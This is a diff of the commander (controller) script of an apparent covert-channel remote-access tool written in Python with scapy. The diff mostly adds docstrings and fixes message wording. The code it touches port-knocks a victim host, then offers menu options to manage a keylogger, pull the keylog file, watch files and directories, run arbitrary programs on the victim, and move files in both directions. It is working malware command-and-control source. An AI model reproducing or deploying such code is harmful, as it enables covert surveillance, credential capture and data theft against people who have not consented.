@@ -6,12 +6,25 @@ from scapy.layers.inet import *
 from utils import get_ip_address, make_dir, display_menu
 from portknocker import perform_knock_sequence
 
+
 def watching(covert):
+    """
+    Continuously receive data from the covert channel for non-victim side.
+
+    Args:
+        covert (CovertChannel): The covert channel instance.
+    """
     while True:
         covert.receive_data(for_victim=False)
 
 
 def handle_choice(covert: CovertChannel):
+    """
+    Handle user choices for interacting with the victim.
+
+    Args:
+        covert (CovertChannel): The covert channel instance.
+    """
     watcher_instance = Watcher()
 
     while True:
@@ -31,10 +44,12 @@ def handle_choice(covert: CovertChannel):
         if choice == 3:
             sig = int(covert.receive_data(for_victim=False))
             if sig == 1:
-                print(f"COMMANDER:: Keylogger should be Stopped before transferring keylog file")
+                print(
+                    f"COMMANDER:: Keylogger should be stopped before transferring keylog file"
+                )
                 continue
             elif sig == 2:
-                print(f"COMMANDER:: keylog file does not exist")
+                print(f"COMMANDER:: Keylog file does not exist")
                 continue
             covert.receive_data(for_victim=False)
 
@@ -47,21 +62,23 @@ def handle_choice(covert: CovertChannel):
 
             sig = int(covert.receive_data(for_victim=False))
             if not sig:
-                print(f"COMMANDER:: Error Occurred, file path not found")
+                print(f"COMMANDER:: Error occurred, file path not found")
                 continue
 
             if not watcher_instance.get_status():
                 watcher_instance.toggle_file()
                 watcher_instance.toggle_status()
-                file_watching_process = multiprocessing.Process(target=watching, args=(covert, ))
+                file_watching_process = multiprocessing.Process(
+                    target=watching, args=(covert,)
+                )
                 file_watching_process.start()
-                print(f"COMMANDER:: Watcher Started on {file}...")
+                print(f"COMMANDER:: Watcher started on {file}...")
                 watcher_instance.set_child(file_watching_process)
             else:
                 if not watcher_instance.watching_dir_or_file():
-                    print(f"COMMADER:: Watching a File already...")
+                    print(f"COMMANDER:: Watching a file already...")
                 elif watcher_instance.watching_dir_or_file():
-                    print(f"COMMANDER:: Watching a Directory already..")
+                    print(f"COMMANDER:: Watching a directory already..")
 
         elif choice == 6:
             direc = input("Enter the directory path to watch on the victim: ")
@@ -71,20 +88,22 @@ def handle_choice(covert: CovertChannel):
             covert.cmd = None
             sig = int(covert.receive_data(for_victim=False))
             if not sig:
-                print(f"COMMANDER:: Error Occurred, directory path not found")
+                print(f"COMMANDER:: Error occurred, directory path not found")
                 continue
             if not watcher_instance.get_status():
                 watcher_instance.toggle_dir()
                 watcher_instance.toggle_status()
-                dir_watching_process = multiprocessing.Process(target=watching, args=(covert, ))
+                dir_watching_process = multiprocessing.Process(
+                    target=watching, args=(covert,)
+                )
                 dir_watching_process.start()
-                print(f"COMMANDER:: Watcher Started on {direc}...")
+                print(f"COMMANDER:: Watcher started on {direc}...")
                 watcher_instance.set_child(dir_watching_process)
             else:
                 if not watcher_instance.watching_dir_or_file():
-                    print(f"COMMADER:: Watching a File already...")
+                    print(f"COMMANDER:: Watching a file already...")
                 elif watcher_instance.watching_dir_or_file():
-                    print(f"COMMANDER:: Watching a Directory already..")
+                    print(f"COMMANDER:: Watching a directory already..")
 
         elif choice == 5 or choice == 7:
             covert.is_watching = False
@@ -92,7 +111,7 @@ def handle_choice(covert: CovertChannel):
                 watcher_instance.stop_watching()
             elif not watcher_instance.get_status():
                 print("COMMANDER:: Watcher instance is not running")
-        
+
         elif choice == 8:
             prog = input("Enter the command/program to run on the victim: ")
             covert.cmd = prog
@@ -100,9 +119,9 @@ def handle_choice(covert: CovertChannel):
             covert.cmd = None
             sig = covert.receive_data(for_victim=False)
             if not sig:
-                print(f"COMMANDER:: Error Occurred, program could not be run")
+                print(f"COMMANDER:: Error occurred, program could not be run")
             else:
-                print(f"COMMANDER:: Program Executed Successfully on Victim\n {sig}")
+                print(f"COMMANDER:: Program executed successfully on victim\n {sig}")
 
         elif choice == 9:
             file = input("Enter file name to transfer FROM victim: ")
@@ -115,17 +134,16 @@ def handle_choice(covert: CovertChannel):
 
         elif choice == 10:
             file = input("Enter file name to transfer TO victim: ")
-            
+
             covert.file_name = file
             covert.send_data(for_victim=True, event="IN_CREATE")
             covert.file_name = None
 
             sig = int(covert.receive_data(for_victim=False))
             if not sig:
-                print(f"COMMANDER:: Error Occurred, file could not be transferred")
+                print(f"COMMANDER:: Error occurred, file could not be transferred")
             else:
-                print(f"COMMANDER:: Transferred file successful\n")
-
+                print(f"COMMANDER:: Transferred file successfully\n")
 
         elif choice == 11:
             print(f"COMMANDER:: DISCONNECTING")
@@ -137,22 +155,41 @@ def handle_choice(covert: CovertChannel):
 
 
 def main():
+    """
+    Main function to initiate the commander and interact with the victim.
+    """
     parser = argparse.ArgumentParser()
-    parser.add_argument('-ip', dest='ip', type=str, help="Victim's IP address", required=True)
-    parser.add_argument('-dport', '--dest_port', type=int, dest='dst_port', help="Victim's port number", default=6000)
-    parser.add_argument('-sport', '--src_port', type=int, dest='src_port', help="Commander's port number", default=7000)
+    parser.add_argument(
+        "-ip", dest="ip", type=str, help="Victim's IP address", required=True
+    )
+    parser.add_argument(
+        "-dport",
+        "--dest_port",
+        type=int,
+        dest="dst_port",
+        help="Victim's port number",
+        default=6000,
+    )
+    parser.add_argument(
+        "-sport",
+        "--src_port",
+        type=int,
+        dest="src_port",
+        help="Commander's port number",
+        default=7000,
+    )
     args = parser.parse_args()
 
     covert_channel = CovertChannel(
         cmd_addr=get_ip_address(),
         cmd_port=args.src_port,
         victim_addr=args.ip,
-        victim_port=args.dst_port
+        victim_port=args.dst_port,
     )
 
     print("COMMANDER:: Initiating Port Knocking...")
     perform_knock_sequence(args.ip, time_out=2)
-    
+
     make_dir(covert_channel.victim_addr)
     handle_choice(covert_channel)
 
